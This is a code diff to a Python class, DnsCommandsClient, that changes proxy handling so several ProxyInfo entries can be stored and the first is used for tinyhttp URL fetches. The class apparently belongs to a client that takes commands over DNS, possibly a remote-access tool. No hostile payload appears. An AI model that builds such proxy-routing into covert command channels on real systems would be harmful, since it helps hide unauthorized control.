@@ -343,7 +343,14 @@ class DnsCommandsClient(Thread):
             logging.error('TinyHTTP is not available')
             return
 
-        http = tinyhttp.HTTP(proxy=self.proxy, follow_redirects=True)
+        proxy = self.proxy
+        if type(self.proxy) in (list, tuple):
+            if len(self.proxy) > 0:
+                proxy = self.proxy[0]
+            else:
+                proxy = None
+
+        http = tinyhttp.HTTP(proxy=proxy, follow_redirects=True)
         content, code = http.get(url, code=True)
         if code == 200:
             try:
@@ -371,8 +378,15 @@ class DnsCommandsClient(Thread):
             return
 
         try:
+            proxy = self.proxy
+            if type(self.proxy) in (list, tuple):
+                if len(self.proxy) > 0:
+                    proxy = self.proxy[0]
+                else:
+                    proxy = None
+
             http = tinyhttp.HTTP(
-                proxy=self.proxy if use_proxy else False,
+                proxy=proxy if use_proxy else False,
                 follow_redirects=True
             )
 
@@ -419,7 +433,12 @@ class DnsCommandsClient(Thread):
         elif scheme.lower() == 'any':
             self.proxy = True
         else:
-            self.proxy = ProxyInfo(scheme, ip, port, user, password)
+            if self.proxy in (None, True, False):
+                self.proxy = []
+
+            self.proxy.append(
+                ProxyInfo(scheme, ip, port, user, password)
+            )
 
     def process(self):
         commands = []
